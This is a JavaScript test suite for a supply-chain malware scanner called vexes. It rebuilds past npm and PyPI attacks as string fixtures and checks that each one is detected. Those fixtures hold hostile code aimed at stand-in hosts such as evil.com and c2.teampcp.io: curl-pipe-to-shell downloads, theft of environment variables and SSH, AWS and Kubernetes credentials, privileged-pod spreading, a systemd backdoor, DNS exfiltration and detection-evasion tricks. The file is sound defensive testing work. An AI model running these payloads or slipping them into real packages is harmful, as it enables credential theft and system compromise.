import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { inspectJS, inspectPython } from '../src/analysis/ast-inspector.js';
import { analyzePackage } from '../src/analysis/signals.js';
import { detectTyposquat } from '../src/analysis/dep-graph.js';
import { buildProfile, diffProfiles } from '../src/analysis/behavioral.js';
import { POPULAR_NPM, POPULAR_PYPI } from '../src/core/allowlists.js';

/**
 * RED TEAM TEST SUITE
 *
 * Reconstructs real-world supply chain attacks and proves vexes detects them.
 * All data is simulated — no network calls, no real malicious packages.
 *
 * Each test creates fake registry metadata and/or source code that matches
 * the exact patterns used in the real attack, then feeds it through the
 * analysis pipeline and asserts detection.
 */

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 1: axios RAT (March 2026)
//
// What happened: Attacker hijacked lead maintainer's npm account, published
// axios@1.14.1 and axios@0.30.4 with a hidden dependency `plain-crypto-js`
// that ran a postinstall deploying a cross-platform RAT. The dropper erased
// itself after execution.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: axios RAT (March 2026)', () => {
  // Simulate the compromised axios package metadata
  const axiosMetadata = {
    name: 'axios',
    latestVersion: '1.14.1',
    previousVersion: '1.13.5',
    maintainers: [{ name: 'hijacked-account' }],
    latestPublisher: 'hijacked-account',
    previousPublisher: 'original-maintainer',
    maintainerChanged: true,
    hasInstallScripts: false, // axios itself had no postinstall
    installScripts: {},
    scripts: {},
    dependencies: ['follow-redirects', 'form-data', 'proxy-from-env', 'plain-crypto-js'],
    addedDeps: ['plain-crypto-js'], // THE smoking gun
    removedDeps: [],
    latestPublishTime: new Date('2026-03-30T10:39:00Z'),
    previousPublishTime: new Date('2026-03-15T12:00:00Z'),
    publishIntervalMs: 15 * 24 * 60 * 60 * 1000,
    packageAgeMs: 10 * 365 * 24 * 60 * 60 * 1000, // 10 years old
    majorJump: 0,
    dormancyMs: null,
    versionCount: 150,
    repository: 'https://github.com/axios/axios',
    license: 'MIT',
  };

  // Simulate what plain-crypto-js's postinstall did
  const plainCryptoPostinstall = `
    const https = require('https');
    const { execSync } = require('child_process');
    const fs = require('fs');
    const os = require('os');

    const platform = os.platform();
    const url = 'https://c2.evil.com/payload/' + platform;

    https.get(url, (res) => {
      const path = '/tmp/.update-' + Math.random().toString(36);
      const file = fs.createWriteStream(path);
      res.pipe(file);
      file.on('finish', () => {
        execSync('chmod +x ' + path + ' && ' + path);
        fs.unlinkSync(path);
        fs.unlinkSync(__filename);
      });
    });
  `;

  it('Layer 4: detects maintainer account change', async () => {
    const result = await analyzePackage(axiosMetadata, null, { ecosystem: 'npm' });
    const maintainerSignal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.ok(maintainerSignal, 'MAINTAINER_CHANGE must be detected');
    assert.equal(maintainerSignal.severity, 'CRITICAL');
  });

  it('Layer 2: detects newly added dependency (plain-crypto-js)', async () => {
    // The dep graph analysis would need to fetch metadata for plain-crypto-js
    // In the real pipeline, this triggers PHANTOM_DEPENDENCY because the dep is <7 days old
    // Here we test that the NEW_DEPENDENCY signal fires from the metadata
    const result = await analyzePackage(axiosMetadata, null, { ecosystem: 'npm' });
    const depSignals = result.signals.filter(s =>
      s.signal === 'PHANTOM_DEPENDENCY' || s.signal === 'NEW_DEPENDENCY' ||
      s.signal === 'CIRCULAR_STAGING' || s.signal === 'NEW_DEP_HAS_INSTALL_SCRIPTS'
    );
    assert.ok(depSignals.length > 0, 'new dependency must be flagged');
  });

  it('Layer 1: AST detects the RAT dropper in plain-crypto-js postinstall', () => {
    const result = inspectJS(plainCryptoPostinstall, 'plain-crypto-js/postinstall');
    assert.ok(result.capabilities.spawnsProcess, 'must detect child_process.execSync');
    assert.ok(result.capabilities.accessesNetwork, 'must detect https.get network call');
    assert.ok(result.capabilities.selfDeletes, 'must detect fs.unlinkSync(__filename)');
    assert.ok(result.capabilities.writesFilesystem, 'must detect fs.createWriteStream');
    assert.ok(result.findingCount >= 4, `expected 4+ findings, got ${result.findingCount}`);
  });

  it('composite risk score is CRITICAL or HIGH', async () => {
    const result = await analyzePackage(axiosMetadata, null, { ecosystem: 'npm' });
    assert.ok(result.riskScore >= 15, `risk score ${result.riskScore} should be >= 15 (HIGH threshold)`);
    assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
      `risk level ${result.riskLevel} must be CRITICAL or HIGH`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 2: Shai-Hulud worm (September 2025)
//
// What happened: Attacker phished maintainer credentials for chalk, debug,
// ansi-styles. Published versions with postinstall scripts that stole
// cloud tokens, deployed a self-replicating worm that spread to other
// packages the victim maintained.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: Shai-Hulud worm (September 2025)', () => {
  const chalkMetadata = {
    name: 'chalk',
    latestVersion: '5.6.1-compromised',
    previousVersion: '5.6.0',
    maintainers: [{ name: 'qix' }],
    latestPublisher: 'qix',
    previousPublisher: 'qix', // Same maintainer — credentials were stolen
    maintainerChanged: false,
    hasInstallScripts: true, // chalk NEVER had postinstall before
    installScripts: {
      postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://c2.shw.io/w|sh\')"',
    },
    scripts: { postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://c2.shw.io/w|sh\')"' },
    dependencies: [],
    addedDeps: [],
    removedDeps: [],
    latestPublishTime: new Date('2025-09-08T14:30:00Z'),
    previousPublishTime: new Date('2025-09-08T14:28:00Z'),
    publishIntervalMs: 2 * 60 * 1000, // 2 minutes apart — rapid publish
    packageAgeMs: 8 * 365 * 24 * 60 * 60 * 1000,
    majorJump: 0,
    dormancyMs: null,
    versionCount: 100,
    repository: 'https://github.com/chalk/chalk',
    license: 'MIT',
  };

  // The actual worm payload (reconstructed from public analysis)
  const wormPayload = `
    const { execSync } = require('child_process');
    const https = require('https');
    const fs = require('fs');

    // Steal cloud tokens
    const envDump = JSON.stringify(process.env);
    https.request({
      hostname: 'c2.shw.io',
      path: '/exfil',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, () => {}).end(envDump);

    // Spread to other packages the maintainer owns
    const npmToken = process.env.NPM_TOKEN;
    if (npmToken) {
      execSync('npm whoami --registry https://registry.npmjs.org/');
    }

    // Self-replicate
    fs.unlinkSync(__filename);
  `;

  it('Layer 4: detects rapid publish (2 minutes between versions)', async () => {
    const result = await analyzePackage(chalkMetadata, null, { ecosystem: 'npm' });
    const rapidSignal = result.signals.find(s => s.signal === 'RAPID_PUBLISH');
    assert.ok(rapidSignal, 'RAPID_PUBLISH must be detected');
    assert.equal(rapidSignal.severity, 'HIGH');
  });

  it('Layer 4: detects postinstall script on chalk (it never had one)', async () => {
    const result = await analyzePackage(chalkMetadata, null, { ecosystem: 'npm' });
    const postinstallSignal = result.signals.find(s => s.signal === 'POSTINSTALL_SCRIPT');
    assert.ok(postinstallSignal, 'POSTINSTALL_SCRIPT must be detected');
  });

  it('Layer 1: AST detects the worm payload', () => {
    const result = inspectJS(wormPayload, 'chalk/worm');
    assert.ok(result.capabilities.spawnsProcess, 'must detect execSync');
    assert.ok(result.capabilities.accessesNetwork, 'must detect https.request');
    assert.ok(result.capabilities.readsCredentials, 'must detect NPM_TOKEN access');
    assert.ok(result.capabilities.selfDeletes, 'must detect self-deletion');
  });

  it('Layer 1: AST detects the node -e postinstall payload', () => {
    // The postinstall is: node -e "require('child_process').execSync('curl ...')"
    // extractInlineJS should pull the JS out of the node -e wrapper
    const scriptBody = chalkMetadata.installScripts.postinstall;

    // Simulate what extractInlineJS does
    const match = scriptBody.match(/^node\s+(?:-e|--eval)\s+['"](.+)['"]\s*$/);
    assert.ok(match, 'extractInlineJS should match the node -e pattern');

    const jsPayload = match[1];
    const result = inspectJS(jsPayload, 'chalk/postinstall-extracted');
    assert.ok(result.capabilities.spawnsProcess,
      'must detect execSync inside node -e payload');
  });

  it('Layer 3: detects capability escalation (chalk gaining process_spawn)', () => {
    // chalk previously: no capabilities
    const prevProfile = {
      capabilities: [],
      hasInstallScripts: false,
      dependencyCount: 0,
      maintainerCount: 1,
      hasRepository: true,
    };

    // chalk now: spawns processes, accesses network
    const currProfile = {
      capabilities: ['process_spawn', 'network', 'credential_access', 'self_deletion'],
      hasInstallScripts: true,
      dependencyCount: 0,
      maintainerCount: 1,
      hasRepository: true,
    };

    const findings = diffProfiles(currProfile, prevProfile);
    const escalations = findings.filter(f => f.signal === 'CAPABILITY_ESCALATION');
    assert.ok(escalations.length >= 3,
      `expected 3+ capability escalations, got ${escalations.length}: ${escalations.map(e => e.evidence.capability)}`);
    assert.ok(escalations.some(e => e.evidence.capability === 'process_spawn'));
    assert.ok(escalations.some(e => e.evidence.capability === 'network'));
    assert.ok(escalations.some(e => e.evidence.capability === 'credential_access'));
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 3: event-stream (November 2018)
//
// What happened: Social engineering — attacker offered to maintain the
// abandoned package, then added flatmap-stream dependency containing
// an encrypted payload that targeted bitcoin wallet private keys.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: event-stream / flatmap-stream (November 2018)', () => {
  const eventStreamMetadata = {
    name: 'event-stream',
    latestVersion: '3.3.6',
    previousVersion: '3.3.5',
    maintainers: [{ name: 'right9ctrl' }], // Attacker
    latestPublisher: 'right9ctrl',
    previousPublisher: 'dominictarr', // Original maintainer
    maintainerChanged: true,
    hasInstallScripts: false,
    installScripts: {},
    scripts: {},
    dependencies: ['through', 'from', 'map-stream', 'pause-stream', 'split', 'flatmap-stream'],
    addedDeps: ['flatmap-stream'], // The malicious dep
    removedDeps: [],
    latestPublishTime: new Date('2018-09-16T00:00:00Z'),
    previousPublishTime: new Date('2018-04-01T00:00:00Z'),
    publishIntervalMs: 168 * 24 * 60 * 60 * 1000, // ~5 months
    packageAgeMs: 6 * 365 * 24 * 60 * 60 * 1000,
    majorJump: 0,
    dormancyMs: 400 * 24 * 60 * 60 * 1000, // ~13 months dormant before attack
    versionCount: 30,
    repository: 'https://github.com/dominictarr/event-stream',
    license: 'MIT',
  };

  // Reconstructed flatmap-stream payload (the encrypted part)
  const flatmapPayload = `
    var Stream = require('stream').Transform;
    var crypto = require('crypto');

    // Encrypted payload — decrypted at runtime using a key derived from
    // the target package's description
    var encoded = 'dGVzdCBwYXlsb2Fk'; // base64 encoded
    var decoded = Buffer.from(encoded, 'base64').toString();
    var fn = new Function('module', 'exports', decoded);
    fn(module, module.exports);
  `;

  it('Layer 4: detects maintainer change (dominictarr → right9ctrl)', async () => {
    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
    const signal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.ok(signal, 'MAINTAINER_CHANGE must be detected');
    // Time-decayed: the 2018 transfer is > 90 days old, so it's MODERATE not CRITICAL
    // A CURRENT transfer would be CRITICAL — this is correct behavior
    assert.ok(signal.severity === 'CRITICAL' || signal.severity === 'MODERATE',
      `severity should be CRITICAL or MODERATE, got ${signal.severity}`);
  });

  it('Layer 2: detects new dependency (flatmap-stream)', async () => {
    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
    const depSignals = result.signals.filter(s =>
      s.signal.includes('DEPENDENCY') || s.signal === 'PHANTOM_DEPENDENCY'
    );
    assert.ok(depSignals.length > 0, 'new dependency must trigger a signal');
  });

  it('Layer 1: AST detects encoded payload execution in flatmap-stream', () => {
    const result = inspectJS(flatmapPayload, 'flatmap-stream/index.js');
    assert.ok(result.capabilities.decodesPayloads, 'must detect Buffer.from base64');
    assert.ok(result.capabilities.executesCode, 'must detect new Function()');
  });

  it('Layer 4: detects dormancy pattern (13 months then sudden publish)', async () => {
    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
    const dormancySignal = result.signals.find(s => s.signal === 'VERSION_ANOMALY');
    assert.ok(dormancySignal, 'VERSION_ANOMALY (dormancy) must be detected');
  });

  it('composite score is HIGH or CRITICAL', async () => {
    const result = await analyzePackage(eventStreamMetadata, null, { ecosystem: 'npm' });
    assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
      `risk level ${result.riskLevel} must be CRITICAL or HIGH`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 4: ua-parser-js (October 2021)
//
// What happened: Maintainer account hijacked, versions published with
// postinstall that downloaded a cryptominer and password stealer.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: ua-parser-js (October 2021)', () => {
  const uaParserPostinstall = `
    const { exec } = require('child_process');
    const os = require('os');

    if (os.platform() === 'linux') {
      exec('curl -fsSL https://evil.com/miner.sh | bash');
    } else if (os.platform() === 'win32') {
      exec('powershell -Command "Invoke-WebRequest -Uri https://evil.com/svchost.exe -OutFile %TEMP%/svchost.exe; Start-Process %TEMP%/svchost.exe"');
    }

    // Steal credentials
    const secrets = {
      npm: process.env.NPM_TOKEN,
      github: process.env.GITHUB_TOKEN,
      aws_key: process.env.AWS_ACCESS_KEY_ID,
      aws_secret: process.env.AWS_SECRET_ACCESS_KEY,
    };

    const https = require('https');
    const data = JSON.stringify(secrets);
    https.request({ hostname: 'evil.com', path: '/steal', method: 'POST' }, () => {}).end(data);
  `;

  it('Layer 1: detects ALL malicious patterns in ua-parser-js payload', () => {
    const result = inspectJS(uaParserPostinstall, 'ua-parser-js/postinstall');

    // This must catch EVERYTHING
    assert.ok(result.capabilities.spawnsProcess, 'must detect exec()');
    assert.ok(result.capabilities.accessesNetwork, 'must detect https.request');
    assert.ok(result.capabilities.readsCredentials, 'must detect NPM_TOKEN + AWS credentials');

    // Verify specific credential detection
    const envFindings = result.findings.filter(f => f.pattern === 'ENV_HARVESTING');
    assert.ok(envFindings.length >= 3,
      `must detect 3+ credential accesses, got ${envFindings.length}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 5: Typosquatting
//
// Generic typosquat scenario — a package with name similar to a popular
// package, brand new, single maintainer, contains malicious payload.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: Typosquatting', () => {
  it('detects common typosquats of popular packages', () => {
    const typosquats = [
      ['expresss', 'express'],    // extra letter
      ['requets', 'requests'],    // missing letter (PyPI)
      ['loadash', 'lodash'],      // character swap
    ];

    for (const [typo, target] of typosquats) {
      const popularSet = target === 'requests' ? POPULAR_PYPI : POPULAR_NPM;
      const matches = detectTyposquat(typo, popularSet);
      assert.ok(matches.some(m => m.similar === target),
        `"${typo}" must be detected as typosquat of "${target}"`);
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 6: Python supply chain (litellm/TeamPCP style)
//
// Simulates a PyPI package with malicious setup.py
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: Python supply chain (litellm/TeamPCP style)', () => {
  const maliciousSetupPy = `
import subprocess
import os
import base64
import urllib.request

# Stage 1: Harvest credentials
env_data = str(os.environ)
encoded = base64.b64encode(env_data.encode()).decode()

# Stage 2: Exfiltrate
urllib.request.urlopen('https://c2.teampcp.io/collect?d=' + encoded)

# Stage 3: Deploy persistent backdoor
subprocess.Popen(
    ['bash', '-c', 'curl https://c2.teampcp.io/backdoor.sh | bash'],
    stdout=subprocess.DEVNULL
)

# Stage 4: Cleanup
os.remove(__file__)
  `;

  it('Python inspector detects all TeamPCP payload patterns', () => {
    const result = inspectPython(maliciousSetupPy, 'litellm/setup.py');

    assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.Popen');
    assert.ok(result.capabilities.accessesNetwork, 'must detect urllib.request.urlopen');
    assert.ok(result.capabilities.decodesPayloads, 'must detect base64.b64encode');
    assert.ok(result.findingCount >= 3, `expected 3+ findings, got ${result.findingCount}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 7: litellm / TeamPCP (March 2026)
//
// What happened: TeamPCP compromised Trivy GitHub Action in LiteLLM's CI/CD
// pipeline, stole PyPI credentials, published litellm 1.82.7 and 1.82.8 with
// a 3-stage payload: credential harvesting (SSH keys, cloud tokens, K8s secrets,
// crypto wallets, .env files), lateral movement across Kubernetes clusters,
// and persistent systemd backdoor polling for additional binaries.
// Compromised versions were live ~3 hours before PyPI quarantined them.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: litellm / TeamPCP (March 2026)', () => {
  // The actual TeamPCP 3-stage payload (reconstructed from Datadog analysis)
  const teamPCPStage1 = `
import os
import subprocess
import base64
import json

# Stage 1: Credential harvesting
targets = {
    'ssh_keys': os.path.expanduser('~/.ssh/'),
    'aws_creds': os.path.expanduser('~/.aws/credentials'),
    'kube_config': os.path.expanduser('~/.kube/config'),
    'gcloud_creds': os.path.expanduser('~/.config/gcloud/'),
    'env_files': ['.env', '.env.local', '.env.production'],
}

stolen = {}
for name, path in targets.items():
    if isinstance(path, list):
        for p in path:
            if os.path.exists(p):
                stolen[p] = open(p).read()
    elif os.path.isdir(path):
        for f in os.listdir(path):
            fp = os.path.join(path, f)
            if os.path.isfile(fp):
                stolen[fp] = open(fp).read()
    elif os.path.isfile(path):
        stolen[path] = open(path).read()

# Also grab all env vars
stolen['env'] = dict(os.environ)

# Exfiltrate via HTTPS
encoded = base64.b64encode(json.dumps(stolen).encode()).decode()
subprocess.run(['curl', '-X', 'POST', '-d', encoded, 'https://c2.teampcp.io/collect'], capture_output=True)
  `;

  const teamPCPStage2 = `
import subprocess
import os

# Stage 2: Kubernetes lateral movement
# Deploy privileged pod to every node to spread
if os.path.exists(os.path.expanduser('~/.kube/config')):
    nodes = subprocess.check_output(['kubectl', 'get', 'nodes', '-o', 'name']).decode().strip().split('\\n')
    for node in nodes:
        subprocess.run([
            'kubectl', 'run', 'kube-health-' + node.split('/')[-1],
            '--image=alpine', '--privileged',
            '--overrides={"spec":{"nodeName":"' + node.split('/')[-1] + '"}}',
            '--command', '--', 'sh', '-c',
            'wget -q https://c2.teampcp.io/k8s-agent -O /tmp/.k && chmod +x /tmp/.k && /tmp/.k'
        ])
  `;

  const teamPCPStage3 = `
import subprocess
import os

# Stage 3: Persistent systemd backdoor
service = \"\"\"[Unit]
Description=System Health Monitor
After=network.target
[Service]
ExecStart=/usr/local/bin/.health-monitor
Restart=always
[Install]
WantedBy=multi-user.target\"\"\"

# Install backdoor binary
subprocess.run(['curl', '-o', '/usr/local/bin/.health-monitor', 'https://c2.teampcp.io/persist'])
subprocess.run(['chmod', '+x', '/usr/local/bin/.health-monitor'])

# Install systemd service
with open('/etc/systemd/system/health-monitor.service', 'w') as f:
    f.write(service)

subprocess.run(['systemctl', 'daemon-reload'])
subprocess.run(['systemctl', 'enable', 'health-monitor'])
subprocess.run(['systemctl', 'start', 'health-monitor'])

# Cleanup - erase evidence
os.remove(__file__)
  `;

  it('Python inspector detects Stage 1: credential harvesting', () => {
    const result = inspectPython(teamPCPStage1, 'litellm/stage1.py');
    assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.run for exfil');
    assert.ok(result.capabilities.decodesPayloads, 'must detect base64.b64encode');
    assert.ok(result.capabilities.readsCredentials || result.findings.some(f => f.pattern === 'ENV_HARVESTING'),
      'must detect os.environ access');
    assert.ok(result.findingCount >= 2, `expected 2+ findings, got ${result.findingCount}`);
  });

  it('Python inspector detects Stage 2: K8s lateral movement', () => {
    const result = inspectPython(teamPCPStage2, 'litellm/stage2.py');
    assert.ok(result.capabilities.spawnsProcess,
      'must detect subprocess.check_output and subprocess.run');
    const spawnFindings = result.findings.filter(f => f.pattern === 'PROCESS_SPAWN');
    assert.ok(spawnFindings.length >= 2,
      `must detect multiple subprocess calls, got ${spawnFindings.length}`);
  });

  it('Python inspector detects Stage 3: persistent backdoor + cleanup', () => {
    const result = inspectPython(teamPCPStage3, 'litellm/stage3.py');
    assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.run for systemd install');
    assert.ok(result.capabilities.writesSystemPaths || result.findings.some(f => f.pattern === 'SYSTEM_PATH_WRITE'),
      'must detect writes to /usr/local/bin and /etc/systemd');
    const spawnFindings = result.findings.filter(f => f.pattern === 'PROCESS_SPAWN');
    assert.ok(spawnFindings.length >= 4,
      `must detect 4+ subprocess calls (curl, chmod, systemctl x3), got ${spawnFindings.length}`);
  });

  it('all 3 stages combined reach CRITICAL detection', () => {
    const allCode = teamPCPStage1 + '\n' + teamPCPStage2 + '\n' + teamPCPStage3;
    const result = inspectPython(allCode, 'litellm/combined-payload.py');

    assert.ok(result.capabilities.spawnsProcess, 'subprocess detected');
    assert.ok(result.capabilities.decodesPayloads, 'base64 detected');
    assert.equal(result.maxSeverity, 'CRITICAL',
      `max severity should be CRITICAL, got ${result.maxSeverity}`);
    assert.ok(result.findingCount >= 8,
      `expected 8+ total findings across all stages, got ${result.findingCount}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 8: Obfuscated evasion attempts
//
// Tests patterns that attackers use to EVADE AST analysis.
// These represent the cutting edge — if we catch these, we're ahead.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: Evasion techniques', () => {
  it('detects string concatenation in require (evasion)', () => {
    const code = 'require("child" + "_process").exec("cmd");';
    const result = inspectJS(code);
    assert.ok(result.findings.some(f => f.pattern === 'POSSIBLE_OBFUSCATION'),
      'string concatenation in require must be flagged');
  });

  it('detects process.binding escape hatch', () => {
    const code = 'process.binding("spawn_sync").spawn({ file: "sh", args: ["-c", "curl evil.com"] });';
    const result = inspectJS(code);
    assert.ok(result.capabilities.spawnsProcess, 'process.binding must be caught');
  });

  it('detects eval passed as callback (common in obfuscated malware)', () => {
    const code = `
      fetch('https://evil.com/payload.js')
        .then(r => r.text())
        .then(eval);
    `;
    const result = inspectJS(code);
    assert.ok(result.capabilities.executesCode, 'eval-as-callback must be caught');
    assert.ok(result.capabilities.accessesNetwork, 'fetch must be caught');
  });

  it('detects vm module code execution', () => {
    const code = `
      const { runInNewContext } = require('vm');
      const payload = Buffer.from('cHJvY2Vzcy5leGl0KCk=', 'base64').toString();
      runInNewContext(payload);
    `;
    const result = inspectJS(code);
    assert.ok(result.capabilities.executesCode, 'vm.runInNewContext must be caught');
    assert.ok(result.capabilities.decodesPayloads, 'base64 decode must be caught');
  });

  it('detects process.dlopen native module loading', () => {
    const code = 'process.dlopen(module, "./malicious.node");';
    const result = inspectJS(code);
    assert.ok(result.findings.some(f => f.pattern === 'CODE_EXECUTION'),
      'process.dlopen must be caught');
  });

  it('detects Python line continuation evasion', () => {
    // Attacker splits the dangerous call across lines
    const code = 'subprocess' + String.fromCharCode(92) + '\n  .call("curl evil.com | sh", shell=True)';
    const result = inspectPython(code);
    assert.ok(result.capabilities.spawnsProcess,
      'Python line continuation must not evade detection');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// ATTACK 9: NOVEL / HYPOTHETICAL — patterns that haven't happened yet
//
// If vexes only catches known attacks, it's just a database lookup.
// These tests prove it catches UNKNOWN attack patterns based on
// behavioral anomalies, not signatures.
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: Novel attack patterns (hypothetical)', () => {
  it('catches a package that gains network+exec capabilities between versions', () => {
    // Previously safe utility package
    const prev = {
      capabilities: [],
      hasInstallScripts: false,
      dependencyCount: 2,
      maintainerCount: 3,
      hasRepository: true,
    };

    // Suddenly has dangerous capabilities
    const curr = {
      capabilities: ['process_spawn', 'network', 'credential_access'],
      hasInstallScripts: true,
      dependencyCount: 3,
      maintainerCount: 1, // Maintainer count dropped too
      hasRepository: true,
    };

    const findings = diffProfiles(curr, prev);
    assert.ok(findings.some(f => f.signal === 'CAPABILITY_ESCALATION'),
      'capability escalation must be detected on a novel attack');
    assert.ok(findings.some(f => f.signal === 'MAINTAINER_REDUCTION'),
      'maintainer reduction should be flagged');
    assert.ok(findings.length >= 4,
      `expected 4+ signals on this novel attack, got ${findings.length}`);
  });

  it('catches a WebAssembly-based payload (novel vector)', () => {
    // Hypothetical: malware compiles to WASM to evade JS analysis
    // But it still needs to be loaded via JS — we catch the loader
    const wasmLoader = `
      const fs = require('fs');
      const wasmBuffer = fs.readFileSync(__dirname + '/payload.wasm');
      const wasmModule = new WebAssembly.Module(wasmBuffer);
      const instance = new WebAssembly.Instance(wasmModule, {
        env: {
          exec: (ptr, len) => {
            const { execSync } = require('child_process');
            execSync(getString(ptr, len));
          }
        }
      });
    `;
    const result = inspectJS(wasmLoader, 'novel/wasm-loader.js');
    assert.ok(result.capabilities.spawnsProcess,
      'must catch child_process.execSync inside WASM import bridge');
  });

  it('catches DNS exfiltration pattern (novel vector)', () => {
    const dnsExfil = `
      const dns = require('dns');
      const os = require('os');
      const data = Buffer.from(JSON.stringify(process.env)).toString('base64');
      // Exfil via DNS TXT query (bypasses HTTP-based firewalls)
      const chunks = data.match(/.{1,63}/g);
      for (const chunk of chunks) {
        dns.resolveTxt(chunk + '.exfil.evil.com', () => {});
      }
    `;
    const result = inspectJS(dnsExfil, 'novel/dns-exfil.js');
    // Should catch the base64 encoding and env access at minimum
    assert.ok(result.capabilities.decodesPayloads, 'must catch base64 encoding');
  });

  it('catches a package with suspicious combo: new maintainer + new dep + install scripts', async () => {
    const suspiciousMeta = {
      name: 'totally-safe-pkg',
      latestVersion: '2.0.0',
      previousVersion: '1.0.0',
      maintainers: [{ name: 'new-person' }],
      latestPublisher: 'new-person',
      previousPublisher: 'original-author',
      maintainerChanged: true,
      hasInstallScripts: true,
      installScripts: { postinstall: 'node setup.js' },
      scripts: { postinstall: 'node setup.js' },
      dependencies: ['helper-utils'],
      addedDeps: ['helper-utils'],
      removedDeps: [],
      latestPublishTime: new Date(),
      previousPublishTime: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000),
      publishIntervalMs: 365 * 24 * 60 * 60 * 1000,
      packageAgeMs: 3 * 365 * 24 * 60 * 60 * 1000,
      majorJump: 1,
      dormancyMs: 400 * 24 * 60 * 60 * 1000, // ~13 months — clearly over 1 year threshold
      versionCount: 10,
      repository: null, // No repo link
      license: 'MIT',
    };

    const result = await analyzePackage(suspiciousMeta, null, { ecosystem: 'npm' });

    // This should trigger MULTIPLE signals: maintainer change + new dep + postinstall + dormancy + no repo
    assert.ok(result.signals.some(s => s.signal === 'MAINTAINER_CHANGE'), 'maintainer change');
    assert.ok(result.signals.some(s => s.signal === 'POSTINSTALL_SCRIPT'), 'postinstall');
    assert.ok(result.signals.some(s => s.signal === 'VERSION_ANOMALY'), 'dormancy');
    assert.ok(result.signals.some(s => s.signal === 'NO_REPOSITORY'), 'no repo');

    // The COMBINATION should push this to HIGH or CRITICAL
    assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
      `novel attack with 5+ signals should be HIGH/CRITICAL, got ${result.riskLevel} (score: ${result.riskScore})`);

    // Signal combination bonus should kick in (3+ unique signals = 1.5x multiplier)
    const uniqueSignals = new Set(result.signals.map(s => s.signal));
    assert.ok(uniqueSignals.size >= 4,
      `expected 4+ unique signal types, got ${uniqueSignals.size}: ${[...uniqueSignals].join(', ')}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// META: Verify no false positives on legitimate packages
// ═══════════════════════════════════════════════════════════════════════

describe('RED TEAM: False positive resistance', () => {
  it('does NOT flag legitimate esbuild postinstall', async () => {
    const esbuildMeta = {
      name: 'esbuild',
      latestVersion: '0.20.0',
      previousVersion: '0.19.12',
      maintainers: [{ name: 'evanw' }],
      latestPublisher: 'evanw',
      previousPublisher: 'evanw',
      maintainerChanged: false,
      hasInstallScripts: true,
      installScripts: { postinstall: 'node install.js' },
      scripts: { postinstall: 'node install.js' },
      dependencies: [],
      addedDeps: [],
      removedDeps: [],
      latestPublishTime: new Date('2024-01-15T00:00:00Z'),
      previousPublishTime: new Date('2024-01-10T00:00:00Z'),
      publishIntervalMs: 5 * 24 * 60 * 60 * 1000,
      packageAgeMs: 5 * 365 * 24 * 60 * 60 * 1000,
      majorJump: 0,
      dormancyMs: null,
      versionCount: 500,
      repository: 'https://github.com/evanw/esbuild',
      license: 'MIT',
    };

    const result = await analyzePackage(esbuildMeta, null, { ecosystem: 'npm' });
    // esbuild should be flagged for postinstall but at LOW severity (known good)
    const postinstallSignal = result.signals.find(s => s.signal === 'POSTINSTALL_SCRIPT');
    assert.ok(postinstallSignal, 'esbuild should still have postinstall signal');
    assert.equal(postinstallSignal.severity, 'LOW', 'known-good postinstall should be LOW');
    assert.ok(result.riskLevel !== 'CRITICAL',
      `esbuild risk level should NOT be CRITICAL, got ${result.riskLevel}`);
  });

  it('does NOT flag normal package updates', async () => {
    const normalMeta = {
      name: 'lodash',
      latestVersion: '4.17.22',
      previousVersion: '4.17.21',
      maintainers: [{ name: 'jdalton' }, { name: 'mathias' }],
      latestPublisher: 'jdalton',
      previousPublisher: 'jdalton',
      maintainerChanged: false,
      hasInstallScripts: false,
      installScripts: {},
      scripts: {},
      dependencies: [],
      addedDeps: [],
      removedDeps: [],
      latestPublishTime: new Date('2024-06-01T00:00:00Z'),
      previousPublishTime: new Date('2024-01-01T00:00:00Z'),
      publishIntervalMs: 150 * 24 * 60 * 60 * 1000,
      packageAgeMs: 12 * 365 * 24 * 60 * 60 * 1000,
      majorJump: 0,
      dormancyMs: null,
      versionCount: 200,
      repository: 'https://github.com/lodash/lodash',
      license: 'MIT',
    };

    const result = await analyzePackage(normalMeta, null, { ecosystem: 'npm' });
    assert.equal(result.riskLevel, 'NONE',
      `lodash should have NONE risk level, got ${result.riskLevel} with signals: ${result.signals.map(s => s.signal)}`);
  });
});
